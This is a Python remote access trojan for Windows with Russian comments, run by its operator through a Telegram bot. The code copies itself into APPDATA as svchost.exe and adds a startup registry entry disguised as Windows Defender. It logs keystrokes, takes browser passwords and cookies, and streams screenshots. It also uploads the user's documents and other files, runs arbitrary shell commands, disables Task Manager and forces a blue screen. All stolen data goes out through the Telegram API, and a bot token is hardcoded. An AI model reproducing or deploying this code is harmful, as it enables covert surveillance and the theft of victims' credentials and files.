import os
import sys
import shutil
import winreg
import socket
import threading
import subprocess
import sqlite3
import json
import base64
import requests
import ctypes
import time
import random
from Crypto.Cipher import AES
from pynput import keyboard, mouse
from PIL import ImageGrab
import telebot
from flask import Flask, render_template_string, request, Response
import io
import screen_brightness_control as sbc
import pyautogui

# ================== КОНФИГУРАЦИЯ ==================
BOT_TOKEN = "7871203662:AAFXxBNfOEjIGQ4K4DD9-aCZvIbBoRXUmCk"
CHAT_ID = "1342423877"
VIRUS_NAME = "svchost.exe"
HIDDEN_PATH = os.path.join(os.environ['APPDATA'], VIRUS_NAME)
KEYLOG_FILE = os.path.join(os.environ['APPDATA'], "keylog.txt")
COOKIES_FILE = os.path.join(os.environ['APPDATA'], "cookies.txt")
# ==================================================

# Функция для получения внешнего IP
def get_external_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "Не удалось получить IP"

# Функция для получения внутреннего IP
def get_internal_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return "Не удалось получить внутренний IP"

# Отправка IP в Telegram при запуске
def send_ip_to_telegram():
    external_ip = get_external_ip()
    internal_ip = get_internal_ip()
    hostname = socket.gethostname()
    username = os.getlogin()
    
    message = f"🎯 НОВАЯ ЖЕРТВА ПОДКЛЮЧЕНА!\n\n" \
              f"🖥️ Хостнейм: {hostname}\n" \
              f"👤 Пользователь: {username}\n" \
              f"🌐 Внешний IP: {external_ip}\n" \
              f"🔧 Внутренний IP: {internal_ip}\n\n" \
              f"💻 Используй команды в Telegram для управления"
    
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                     data={"chat_id": CHAT_ID, "text": message})
    except:
        pass

# Установка и скрытие
def install():
    if not os.path.exists(HIDDEN_PATH):
        shutil.copyfile(sys.argv[0], HIDDEN_PATH)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "Windows Defender", 0, winreg.REG_SZ, HIDDEN_PATH)
        winreg.CloseKey(key)

# ================== ПРАНКИ ==================
def open_many_windows():
    for i in range(50):
        try:
            subprocess.Popen(['notepad.exe'])
            subprocess.Popen(['calc.exe'])
        except:
            pass

def fake_blue_screen():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    except:
        os.system("shutdown /r /t 0")

def mouse_prank():
    def move_mouse():
        while True:
            x = random.randint(0, 1920)
            y = random.randint(0, 1080)
            pyautogui.moveTo(x, y, duration=0.5)
            time.sleep(3)
    threading.Thread(target=move_mouse, daemon=True).start()

def screen_flip():
    try:
        ctypes.windll.user32.SetDisplayConfig(0, 0, 0, 0, 0x00000080)
    except:
        pass

def disable_task_manager():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                            0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def win_locker():
    def lock_screen():
        time.sleep(10)
        ctypes.windll.user32.LockWorkStation()
    threading.Thread(target=lock_screen, daemon=True).start()

# ================== ТРАНСЛЯЦИЯ ЭКРАНА ==================
def screen_stream():
    while True:
        try:
            screenshot = ImageGrab.grab()
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_byte_arr = img_byte_arr.getvalue()
            
            # Отправка скриншота в Telegram
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                         data={"chat_id": CHAT_ID},
                         files={"photo": ("screen.png", img_byte_arr)})
            time.sleep(5)  # Скрин каждые 5 секунд
        except:
            time.sleep(10)

# ================== КРАЖА ВСЕХ ФАЙЛОВ ==================
def steal_all_files():
    important_extensions = ['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', 
                           '.jpg', '.jpeg', '.png', '.zip', '.rar', '.7z',
                           '.sql', '.db', '.config', '.ini', '.log']
    
    stolen_files = []
    for root, dirs, files in os.walk(os.environ['USERPROFILE']):
        for file in files:
            if any(file.endswith(ext) for ext in important_extensions):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'rb') as f:
                        file_data = f.read()
                    stolen_files.append((file, file_data))
                except:
                    pass
    return stolen_files

# Кейлоггер
def keylogger():
    def on_press(key):
        try:
            with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"{key} ")
        except:
            pass
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Кража паролей браузеров
def steal_browser_passwords():
    browsers = {
        "Chrome": os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
        "Edge": os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
        "Firefox": os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    }
    
    passwords = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            try:
                conn = sqlite3.connect(path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, pass_enc in cursor.fetchall():
                    passwords.append(f"{browser}|{url}|{user}|{pass_enc}")
            except:
                pass
    return passwords

# Кража cookies
def steal_cookies():
    browsers = {
        "Chrome": os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies"),
        "Edge": os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Cookies")
    }
    
    cookies = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            try:
                conn = sqlite3.connect(path)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, value FROM cookies")
                for host, name, value in cursor.fetchall():
                    cookies.append(f"{browser}|{host}|{name}|{value}")
            except:
                pass
    return cookies

# Выполнение команд
def execute_command(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return result.decode("cp866", errors="ignore")
    except Exception as e:
        return str(e)

# Telegram бот
def telegram_bot():
    bot = telebot.TeleBot(BOT_TOKEN)
    
    @bot.message_handler(commands=['start'])
    def start(message):
        external_ip = get_external_ip()
        internal_ip = get_internal_ip()
        bot.reply_to(message, f"✅ RAT активен на {socket.gethostname()}\n"
                             f"🌐 Внешний IP: {external_ip}\n"
                             f"🔧 Внутренний IP: {internal_ip}\n\n"
                             f"🔧 Команды:\n"
                             f"/cmd - Выполнить команду\n"
                             f"/keylog - Получить кейлог\n"
                             f"/passwords - Украсть пароли\n"
                             f"/cookies - Украсть cookies\n"
                             f"/screenshot - Скриншот\n"
                             f"/sysinfo - Информация о системе\n"
                             f"/stream_start - Начать трансляцию экрана\n"
                             f"/stream_stop - Остановить трансляцию\n"
                             f"/files - Украсть все файлы\n"
                             f"/prank_windows - Открыть много окон\n"
                             f"/prank_bsod - Синий экран смерти\n"
                             f"/prank_mouse - Двигать мышку\n"
                             f"/prank_screen - Перевернуть экран\n"
                             f"/prank_lock - Заблокировать Windows\n"
                             f"/prank_disabletm - Отключить диспетчер задач")
    
    @bot.message_handler(commands=['cmd'])
    def cmd_handler(message):
        command = message.text.replace('/cmd ', '')
        result = execute_command(command)
        bot.reply_to(message, f"Команда: {command}\nРезультат:\n{result}")
    
    @bot.message_handler(commands=['keylog'])
    def keylog_handler(message):
        if os.path.exists(KEYLOG_FILE):
            with open(KEYLOG_FILE, "r", encoding="utf-8") as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.reply_to(message, "Кейлоггер пуст")
    
    @bot.message_handler(commands=['passwords'])
    def passwords_handler(message):
        passwords = steal_browser_passwords()
        if passwords:
            with open("passwords.txt", "w", encoding="utf-8") as f:
                f.write("\n".join(passwords))
            with open("passwords.txt", "rb") as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.reply_to(message, "Пароли не найдены")
    
    @bot.message_handler(commands=['cookies'])
    def cookies_handler(message):
        cookies = steal_cookies()
        if cookies:
            with open("cookies.txt", "w", encoding="utf-8") as f:
                f.write("\n".join(cookies))
            with open("cookies.txt", "rb") as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.reply_to(message, "Cookies не найдены")
    
    @bot.message_handler(commands=['screenshot'])
    def screenshot_handler(message):
        screenshot = ImageGrab.grab()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr = img_byte_arr.getvalue()
        bot.send_photo(message.chat.id, img_byte_arr)
    
    @bot.message_handler(commands=['sysinfo'])
    def sysinfo_handler(message):
        external_ip = get_external_ip()
        internal_ip = get_internal_ip()
        info = f"""
🖥️ Система: {os.name}
👤 Пользователь: {os.getlogin()}
🏠 Хостнейм: {socket.gethostname()}
🌐 Внешний IP: {external_ip}
🔧 Внутренний IP: {internal_ip}
        """
        bot.reply_to(message, info)
    
    @bot.message_handler(commands=['stream_start'])
    def stream_start_handler(message):
        global streaming
        streaming = True
        threading.Thread(target=screen_stream, daemon=True).start()
        bot.reply_to(message, "🎥 Трансляция экрана запущена! Скриншоты каждые 5 секунд")
    
    @bot.message_handler(commands=['stream_stop'])
    def stream_stop_handler(message):
        global streaming
        streaming = False
        bot.reply_to(message, "🎥 Трансляция экрана остановлена")
    
    @bot.message_handler(commands=['files'])
    def files_handler(message):
        bot.reply_to(message, "📁 Начинаю кражу файлов...")
        stolen_files = steal_all_files()
        for file_name, file_data in stolen_files:
            try:
                bot.send_document(message.chat.id, (file_name, file_data))
            except:
                pass
        bot.reply_to(message, f"✅ Украдено файлов: {len(stolen_files)}")
    
    # Пранки
    @bot.message_handler(commands=['prank_windows'])
    def prank_windows_handler(message):
        threading.Thread(target=open_many_windows, daemon=True).start()
        bot.reply_to(message, "🪟 Открываю 50+ окон!")
    
    @bot.message_handler(commands=['prank_bsod'])
    def prank_bsod_handler(message):
        threading.Thread(target=fake_blue_screen, daemon=True).start()
        bot.reply_to(message, "💀 Синий экран смерти активирован!")
    
    @bot.message_handler(commands=['prank_mouse'])
    def prank_mouse_handler(message):
        threading.Thread(target=mouse_prank, daemon=True).start()
        bot.reply_to(message, "🐭 Мышь сошла с ума!")
    
    @bot.message_handler(commands=['prank_screen'])
    def prank_screen_handler(message):
        threading.Thread(target=screen_flip, daemon=True).start()
        bot.reply_to(message, "🔄 Экран перевернут!")
    
    @bot.message_handler(commands=['prank_lock'])
    def prank_lock_handler(message):
        threading.Thread(target=win_locker, daemon=True).start()
        bot.reply_to(message, "🔒 Windows заблокирована через 10 секунд!")
    
    @bot.message_handler(commands=['prank_disabletm'])
    def prank_disabletm_handler(message):
        disable_task_manager()
        bot.reply_to(message, "🚫 Диспетчер задач отключен!")
    
    bot.polling(none_stop=True)

# Главная функция
if __name__ == "__main__":
    # Установка
    install()
    
    # Отправка IP в Telegram при запуске
    send_ip_to_telegram()
    
    # Запуск кейлоггера в фоне
    keylog_thread = threading.Thread(target=keylogger, daemon=True)
    keylog_thread.start()
    
    # Запуск Telegram бота в фоне
    tg_thread = threading.Thread(target=telegram_bot, daemon=True)
    tg_thread.start()
    
    # Бесконечный цикл
    while True:
        time.sleep(3600)